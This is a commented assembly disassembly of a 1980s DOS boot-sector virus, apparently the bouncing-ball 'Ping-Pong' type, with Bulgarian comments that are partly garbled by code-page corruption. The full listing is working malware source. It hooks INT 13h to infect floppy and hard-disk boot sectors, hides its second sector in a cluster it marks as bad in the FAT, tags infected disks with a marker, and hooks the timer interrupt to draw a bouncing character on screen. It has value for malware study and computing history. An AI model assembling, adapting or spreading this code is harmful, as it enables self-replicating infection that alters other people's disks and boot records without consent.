;	Advanced Fullscreen Disassembler v2.11
;	Copyright (C) by Rumen Gerasimov (GERISOFT), 1987, 1988
;
;	First listing: without DATA segment
;
;       Segment value: 0000, length: 0200
;

BIOS_SEG	SEGMENT at 0h
	org	0020h
D0020		dw	0
D0022		dw	0
INTERR8 	label	far
	org	004Ch
D004C		dw	0
D004E		dw	0
	org	0413h
D0413		dw	0
BIOS_SEG	ends


BOOT_SEG	SEGMENT at  7Ch
	org	0
BOOT_PROCESS	label far
BOOT_SEG	ends


DISK_ROM	SEGMENT at  0C800h
	org	256h
C800_SEG	label	far
DISK_ROM	ends





SEG0000 segment public	para	'CODE'
	assume	CS:SEG0000, ds:SEG0000

;***********************************************************;
;	      ПЪРВИ СЕКТОР - НАЧАЛО НА ВИРУСА		    ;
;	     НАМИРА СЕ НА boot sector НА ДИСКА		    ;
;***********************************************************;
;  Т│к ад░е▒║▓ е 0000:7C00 или 07C0:0000
;
	ORG	7C00h

	JMP	short L7C1E

D7C02	db	90h
	db	'IBM  3.1'
	DB	0
	DB	2
D7C0D	DB	2
D7C0E	DW	1
	DB	2
	DB	70h
	DB	0
D7C13	DW	2D0h
	DB	0FDh
	DB	2
	DB	0
D7C18	DW	9	;Sector per track - SecPTrk
D7C1A	DW	2	;Side per track   - SidPTrk
D7C1C	DW	0

L7C1E:	XOR	AX,AX
	MOV	SS,AX
	MOV	SP,7C00h
	MOV	DS,AX

	assume	ds:BIOS_SEG
	MOV	AX,Word Ptr D0413	;Намал┐ва BIOS MEMSIZE ▒ 2
	SUB	AX,0002h
	MOV	Word Ptr D0413,AX
	assume	ds:SEG0000

	MOV	CL,06h
	SHL	AX,CL
	SUB	AX,07C0h
	MOV	ES,AX			;ES: ▒егмен▓а на зае▓и▓е 2К паме▓
	MOV	SI,7C00h
	MOV	DI,SI
	MOV	CX,0100h
	REPZ MOVSW			;ме▒▓и ▒е ▓ам: ╢ели┐▓ ▒ек▓о░

	db	08Eh,0C8h   ;MOV     CS,AX	;п░едава │п░авление▓о на ново▓о м┐▒▓о
					;CS:7C00 - ад░е▒ на на╖ало▓о на кода
	PUSH	CS
	POP	DS
	CALL	L7C4A

L7C4A:	XOR	AH,AH			;RESET на INT 13
	INT	13h
	AND	Byte Ptr D7DF8,80h	;У▒▓░ой▒▓во▓о е п║░ви ди▒к (A: - floppy
					;			    C: - hard


	MOV	BX,Word Ptr D7DF9	;Че▓е п║░ви┐▓ ▒ек▓о░, к║де▓о е п░од║л-
	PUSH	CS			;жение▓о
	POP	AX
	SUB	AX,0020h
	MOV	ES,AX			;adres = (CS - 20h):8000h
	CALL	L7C9D

	MOV	BX,Word Ptr D7DF9	;Че▓е в▓о░и┐▓ ▒ек▓о░ о▓ п░од║лжение▓о
	INC	BX			; (но░мални┐▓ BOOT)
	MOV	AX,0FFC0h		;adres = 0000:7C00
	MOV	ES,AX
	CALL	L7C9D

	XOR	AX,AX
	MOV	Byte Ptr D7DF7,AL	;Чи▒▓и ▒▓а▓│▒-бай▓а (за по▒ле)
	MOV	DS,AX

	assume	ds:BIOS_SEG
	MOV	AX,Word Ptr D004C	;Зака╖ва ▒е за INT 13!
	MOV	BX,Word Ptr D004E
	MOV	Word Ptr D004C,offset NewINT13
	MOV	Word Ptr D004E,CS
	PUSH	CS
	POP	DS
	assume	ds:SEG0000
	MOV	Word Ptr D7D2A,AX	;Запазва ▒▓а░и┐▓ ад░е▒ на INT 13
	MOV	Word Ptr D7D2C,BX

	MOV	DL,Byte Ptr D7DF8	;Взема │▒▓░ой▒▓во▓о за BOOT и ▒▓а░▓и░а
	jmp	 BOOT_PROCESS		 ;но░мални┐▓ BOOT process



;================================================================;
;	  ПРОГРАМА ЗА ЧЕТЕНЕ  (L7C9D) И ЗАПИС (L7C98)		 ;
;		 НА ЛОГИЧЕСКИ СЕКТОР ОТ ДИСК			 ;
;----------------------------------------------------------------;
;  BX - ▒ек▓о░ о▓но▒но на╖ало▓о, кой▓о ▓░┐бва да ▒е п░о╖е▓е	 ;
;  ES:8000 - ад░е▒, к║де▓о да ▒е п░о╖е▓е ▒ек▓о░║▓		 ;
;								 ;
;  D7DF8   - │▒▓░ой▒▓во, о▓ кое▓о ╖е▓е				 ;
;								 ;
;================================================================;
L7C98:	MOV	AX,0301h
	JMP	short L7CA0

L7C9D:	MOV	AX,0201h
L7CA0:	XCHG	BX,AX
	ADD	AX,Word Ptr D7C1C
	XOR	DX,DX

	DIV	Word Ptr D7C18		;п░ев░║╣а логи╖е▒ки┐▓ ▒ек▓о░ в AX
	INC	DL			; (0-7..) в║в Track, Side, Sector
	MOV	CH,DL			;в ░еги▒▓░и▓е CX, DX (за INT 13)
	XOR	DX,DX
	DIV	Word Ptr D7C1A
	MOV	CL,06h
	SHL	AH,CL
	OR	AH,CH
	MOV	CX,AX
	XCHG	CH,CL
	MOV	DH,DL

	MOV	AX,BX
L7CC3:	MOV	DL,Byte Ptr D7DF8	;взема номе░а на ди▒ка за ╖е▓ене (A:)
	MOV	BX,8000h
	INT	13h
	JNC	L7CCF
	POP	AX			;▒капва ▒▓ека и загива, ако има I/O err
L7CCF:	RET



;========================================================================;
;	ТАЗИ ПРОГРАМА СЕ ВРЪЗВА НА МЯСТОТО НА ИСТИНСКИЯТ  INT 13	 ;
;========================================================================;
NewINT13:
	PUSH	DS			;Запазва ░еги▒▓░и▓е
	PUSH	ES
	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX

	PUSH	CS			;Оп░ав┐ ▒во┐ DS и ES
	POP	DS
	PUSH	CS
	POP	ES

	TEST	Byte Ptr D7DF7,01h	;Ако е 1 - в║зп░оизвеждане на ви░│▒а,
	JNE	L7D23			; о▓ива да пи╕е ▒║▒ ▒▓анда░▓. INT 13

	CMP	AH,02h			;Че▓ене на ▒ек▓о░?
	JNE	L7D23			;Не, п░од║лжава ▒║▒ ▒▓анда░▓ни┐▓ INT 13

	CMP	Byte Ptr D7DF8,DL	;У▒▓░ой▒▓во▓о ▒║впада ▒ по▒ледно▓о
	MOV	Byte Ptr D7DF8,DL	; ▒ кое▓о е ░або▓ено
	JNE	L7D12			;Не

	XOR	AH,AH			;Взема в░еме▓о
	INT	1Ah
	TEST	DH,7Fh			;би▓ 8000 на low order part = 1?
	JNE	L7D03			;да, п░е▒ка╖а
	TEST	DL,0F0h 		;би▓ове 00F0 на low order part = 1?
	JNE	L7D03			;да, п░е▒ка╖а
				;П░о┐ва: кога▓о TIMER .and. 80F0h == 0
				;П░иблизи▓елно на 1800 ▒ек. = 30 мин.

	PUSH	DX
	call	L7EB3			;П░о┐ва на ви░│▒а - ▒ка╖а по ек░ана
	POP	DX

L7D03:	MOV	CX,DX			;Оп░едел┐ ▓░┐бва ли да за░аз┐ва
	SUB	DX,Word Ptr D7EB0	; (под╡од┐╣ момен▓ в░еме)
	MOV	Word Ptr D7EB0,CX
	SUB	DX,+24h
	JC	L7D23

L7D12:	OR	Byte Ptr D7DF7,01h	;С▓а░▓и░а в║зп░оизвеждане/за░аз┐ване
	PUSH	SI
	PUSH	DI
	CALL	L7D2E
	POP	DI
	POP	SI
	AND	Byte Ptr D7DF7,0FEh

L7D23:	POP	DX			;В║з▒▓анов┐ва по▓░еби▓ел▒ки▓е ░еги▒▓░и
	POP	CX
	POP	BX
	POP	AX
	POP	ES
	POP	DS
D7D2A	=	$+1
D7D2C	=	$+3
	jmp	c800_SEG		;С▓а░▓и░а и▒▓ин▒ки┐▓ INT 13



;================================================================;
;	ВЪЗПРОИЗВЕЖДАНЕ НА ВИРУСА И ЗАРАЗЯВАНЕ НА ПРОГРАМА	 ;
;================================================================;
L7D2E:	MOV	AX,0201h		;Че▓е BOOT sector о▓ ди▒ка
	MOV	DH,00h			; BX = ?????????????????????? к║де, бе!
	MOV	CX,0001h
	CALL	L7CC3

	TEST	Byte Ptr D7DF8,80h	;HARD DISK?
	JE	L7D63			;не

    ;---- HARD DISK ----;
	MOV	SI,81BEh		;Т║░▒и DOS partition
	MOV	CX,0004h
L7D46:	CMP	Byte Ptr [SI+04h],01h
	JE	L7D58
	CMP	Byte Ptr [SI+04h],04h
	JE	L7D58
	ADD	SI,+10h
	LOOP	L7D46
	RET				;н┐ма DOS partition, не за░аз┐ва

    ;---- Наме░ен е DOS partition ----;
L7D58:	MOV	DX,Word Ptr [SI]
	MOV	CX,Word Ptr [SI+02h]
	MOV	AX,0201h
	CALL	L7CC3			;Че▓е BOOT sector о▓ DOS partition

    ;---- Т│к идва ако е ди▒ке▓а, п░о╖е▓ен е BOOT sector ----;
L7D63:	MOV	SI,8002h
	MOV	DI,offset D7C02
	MOV	CX,001Ch
	REPZ MOVSB			;ме▒▓и BPB ▓абли╢а▓а о▓ BOOT sector

	CMP	Word Ptr D8000+01FCh,1357h    ;За░азен ли е ди▒ка?
	JNE	L7D8B			;не

	CMP	Byte Ptr D8000+01FBh,00h    ;К║де ли ▒о╖и DS?
	JNC	L7D8A

    ;---- Ди▒ка е за░азен ----;   ;---- Т│к май н┐ма да дойде никога? ----;
	MOV	AX,Word Ptr D8000+01F5h     ;Божа ░або▓а...
	MOV	Word Ptr D7DF5,AX
	MOV	SI,Word Ptr D8000+01F9h
	jmp	L7E92

L7D8A:	RET



;-------------------
;	ДИСКА НЕ Е ЗАРАЗЕН, ПОЧВА ЗАРАЗЯВАНЕТО
;
L7D8B:	CMP	Word Ptr D8000+000Bh,0200h	;Това не е ин▓е░е▒но
	JNE	L7D8A
	CMP	Byte Ptr D8000+000Dh,02h
	JC	L7D8A
	MOV	CX,Word Ptr D8000+000Eh
	MOV	AL,Byte Ptr D8000+0010h
	CBW
	MUL	Word Ptr D8000+0016h
	ADD	CX,AX
	MOV	AX,0020h
	MUL	Word Ptr D8000+0011h
	ADD	AX,01FFh
	MOV	BX,0200h
	DIV	BX
	ADD	CX,AX
	MOV	Word Ptr D7DF5,CX
	MOV	AX,Word Ptr D7C13
	SUB	AX,Word Ptr D7DF5
	MOV	BL,Byte Ptr D7C0D
	XOR	DX,DX
	XOR	BH,BH
	DIV	BX
	INC	AX
	MOV	DI,AX
	AND	Byte Ptr D7DF7,0FBh
	CMP	AX,0FF0h
	JBE	L7DE0
	OR	Byte Ptr D7DF7,04h
L7DE0:	MOV	SI,0001h
	MOV	BX,Word Ptr D7C0E
	DEC	BX
	MOV	Word Ptr D7DF3,BX
	MOV	Byte Ptr D7EB2,0FEh
	JMP	short L7E00

D7DF3	DW	1
D7DF5	DW	000Ch
D7DF7	DB	1	    ;▒▓а▓│▒-бай▓:
			    ;  0000 0001 - ▒▓а░▓и░ано е в║зп░оизвеждане
			    ;  0000 0010 - зака╖ен е на INT 08
			    ;  0000 0100
D7DF8	DB	00	;│▒▓░ой▒▓во: 0 - A:, 1 - B:, ...
D7DF9	DW	274h	;логи╖е▒ки ▒ек▓о░, к║де▓о е запи▒ано п░од║лжение▓о


	DB	00

	DW	1357h		;ИНДИКАТОР ЗА ЗАРАЗЕН ДИСК!!!!!!!!

	DW	0AA55h		;но░мален BOOT ▒ек▓о░


;***********************************************************;
;	   ВТОРИ СЕКТОР - ПРОДЪЛЖЕНИЕ НА ВИРУСА 	    ;
;	 НАМИРА СЕ НА bad sector НАВЪТРЕ В ДИСКА	    ;
;***********************************************************;
L7E00:	INC	Word Ptr D7DF3
	MOV	BX,Word Ptr D7DF3
	ADD	Byte Ptr D7EB2,02h
	call	L7C9D
	JMP	short L7E4B
L7E12:	MOV	AX,0003h
	TEST	Byte Ptr D7DF7,04h
	JE	L7E1D
	INC	AX
L7E1D:	MUL	SI
	SHR	AX,1
	SUB	AH,Byte Ptr D7EB2
	MOV	BX,AX
	CMP	BX,01FFh
	JNC	L7E00
	MOV	DX,Word Ptr D8000[BX]
	TEST	Byte Ptr D7DF7,04h
	JNE	L7E45
	MOV	CL,04h
	TEST	SI,0001h
	JE	L7E42
	SHR	DX,CL
L7E42:	AND	DH,0Fh
L7E45:	TEST	DX,0FFFFh
	JE	L7E51
L7E4B:	INC	SI
	CMP	SI,DI
	JBE	L7E12
	RET
L7E51:	MOV	DX,0FFF7h
	TEST	Byte Ptr D7DF7,04h
	JNE	L7E68
	AND	DH,0Fh
	MOV	CL,04h
	TEST	SI,0001h
	JE	L7E68
	SHL	DX,CL
L7E68:	OR	Word Ptr D8000[BX],DX
	MOV	BX,Word Ptr D7DF3
	call	L7C98
	MOV	AX,SI
	SUB	AX,0002h

	MOV	BL,Byte Ptr D7C0D
	XOR	BH,BH
	MUL	BX
	ADD	AX,Word Ptr D7DF5
	MOV	SI,AX
	MOV	BX,0000h
	call	L7C9D

	MOV	BX,SI
	INC	BX
	call	L7C98

L7E92:	MOV	BX,SI
	MOV	Word Ptr D7DF9,SI
	PUSH	CS
	POP	AX
	SUB	AX,0020h
	MOV	ES,AX
	call	L7C98

	PUSH	CS
	POP	AX
	SUB	AX,0040h
	MOV	ES,AX
	MOV	BX,0000h
	call	L7C98
	RET

D7EB0	DW	0EEF0h
D7EB2	DB	0


;=======================================================;
;	ЗАКАЧВАНЕ ЗА int 08, АКО НЕ Е ЗАКАЧЕНА		;
;=======================================================;
L7EB3:	TEST	Byte Ptr D7DF7,02h
	JNE	L7EDE
	OR	Byte Ptr D7DF7,02h

	assume	ds:BIOS_SEG
	MOV	AX,0000h		;Зака╖ва ▒е на INT 8
	MOV	DS,AX
	MOV	AX,Word Ptr D0020
	MOV	BX,Word Ptr D0022
	MOV	Word Ptr D0020,offset NewINT08
	MOV	Word Ptr D0022,CS
	assume	ds:SEG0000
	PUSH	CS
	POP	DS
	MOV	Word Ptr D7FC9,AX	;Запазва ▒▓а░и┐▓ INT 8
	MOV	Word Ptr D7FCB,BX

L7EDE:	RET


;=====================================================================;
;	ТАЗИ ПРОГРАМА СЕ ВРЪЗВА НА МЯСТОТО НА ИСТИНСКИЯТ int 08       ;
;=====================================================================;
NewINT08:
	PUSH	DS			;Запазва по▓░еби▓ел▒ки▓е ░еги▒▓░и
	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX

	PUSH	CS			;Оп░ав┐ ▒об▒▓вени┐▓ DS
	POP	DS

	MOV	AH,0Fh			;Get current video mode
	INT	10h

	MOV	BL,AL
	CMP	BX,Word Ptr D7FD4	;mode = ▒▓а░и┐▓ mode
	JE	L7F27			;да, п░од║лжава

    ;---- Режим║▓ на ди▒плей е п░оменен. У▒▓анов┐в┐ нови┐▓ ░ежим ----;
	MOV	Word Ptr D7FD4,BX	;запи▒ва ▒▓░ани╢а▓а и mode
	DEC	AH
	MOV	Byte Ptr D7FD6,AH	;запазва char_per_line-1

	MOV	AH,01h
	CMP	BL,07h			;mode = text b/w MGA, EGA?
	JNE	L7F05			;не
	DEC	AH

L7F05:	CMP	BL,04h			;mode = graphics?
	JNC	L7F0C			;да
	DEC	AH

L7F0C:	MOV	Byte Ptr D7FD3,AH
	MOV	Word Ptr D7FCF,0101h
	MOV	Word Ptr D7FD1,0101h

	MOV	AH,03h			;Read cursor position and size
	INT	10h

	PUSH	DX			;Запазва пози╢и┐▓а на к│░▒о░а

	MOV	DX,Word Ptr D7FCF
	JMP	short L7F4A


    ;---- Режим║▓ на ди▒пле┐ (mode) не е п░омен┐н ----;
L7F27:	MOV	AH,03h			;Read cursor position and size
	INT	10h

	PUSH	DX			;Запазва cursor pos & size

	MOV	AH,02h			;Set cursor position
	MOV	DX,Word Ptr D7FCF
	INT	10h

	MOV	AX,Word Ptr D7FCD	;Оп░едел┐ какво да пи╕е по ек░ана
	CMP	Byte Ptr D7FD3,01h	;mode = GRAPF?
	JNE	L7F41			;не
	MOV	AX,8307h

L7F41:	MOV	BL,AH			;Write character & attribute
	MOV	CX,0001h
	MOV	AH,09h
	INT	10h



    ;---- Ко░иги░а пози╢и┐▓а на к│░▒о░а ----;
L7F4A:	MOV	CX,Word Ptr D7FD1

	CMP	DH,00h			;Up
	JNE	L7F58
	XOR	CH,0FFh
	INC	CH

L7F58:	CMP	DH,18h			;Down
	JNE	L7F62
	XOR	CH,0FFh
	INC	CH

L7F62:	CMP	DL,00h			;Left
	JNE	L7F6C
	XOR	CL,0FFh
	INC	CL

L7F6C:	CMP	DL,Byte Ptr D7FD6	;Right
	JNE	L7F77
	XOR	CL,0FFh
	INC	CL

L7F77:	CMP	CX,Word Ptr D7FD1
	JNE	L7F94
	MOV	AX,Word Ptr D7FCD
	AND	AL,07h
	CMP	AL,03h
	JNE	L7F8B
	XOR	CH,0FFh
	INC	CH
L7F8B:	CMP	AL,05h
	JNE	L7F94
	XOR	CL,0FFh
	INC	CL

L7F94:	ADD	DL,CL
	ADD	DH,CH
	MOV	Word Ptr D7FD1,CX
	MOV	Word Ptr D7FCF,DX
	MOV	AH,02h
	INT	10h			;Set cursor position

	MOV	AH,08h			;Read character & attribute
	INT	10h

	MOV	Word Ptr D7FCD,AX
	MOV	BL,AH
	CMP	Byte Ptr D7FD3,01h	;mode = GRAPH?
	JNE	L7FB6			;не
	MOV	BL,83h

L7FB6:	MOV	CX,0001h		;Write character & attribute
	MOV	AX,0907h
	INT	10h

	POP	DX			;Restore cursor position
	MOV	AH,02h
	INT	10h

	POP	DX			;В║з▒▓анов┐ва по▓░еби▓ел▒ки▓е ░еги▒▓░и
	POP	CX
	POP	BX
	POP	AX
	POP	DS
D7FC9	=	$+1
D7FCB	=	$+3
	JMP	INTERR8 		;О▓ива на и▒▓ин▒ки┐▓ INT 08

D7FCD	DW	0
D7FCF	DW	0101h			;Рабо▓на пози╢и┐ на ек░ана на ви░│▒а
D7FD1	DW	0101h
D7FD3	DB	0			; 1 - mode = graph, b800
					; 0 - mode = text,  b800
					;-1 - mode = 7, text b/w EGA,HGA

D7FD4	DW	0FFFFh			;▒ами┐▓ mode
D7FD6	DB	50h			;б░ой ▒имволи на ░ед


	DB	0B7h,0B7h,0B7h,0B6h,040h,040h,088h,0DEh
	DB	0E6h,05Ah,0ACh,0D2h,0E4h,0EAh,0E6h,040h
	DB	050h,0ECh,040h,064h,05Ch,060h,052h,040h
	DB	040h,040h,040h,064h,062h,05Eh,062h,060h
	DB	05Eh,070h,06Eh,040h,041h,0B7h,0B7h,0B7h
	DB	0B6h


;*************************************************************
;	      РАБОТНА ОБЛАСТ НА ВИРУСА
D8000	=	$

SEG0000 ends
	END
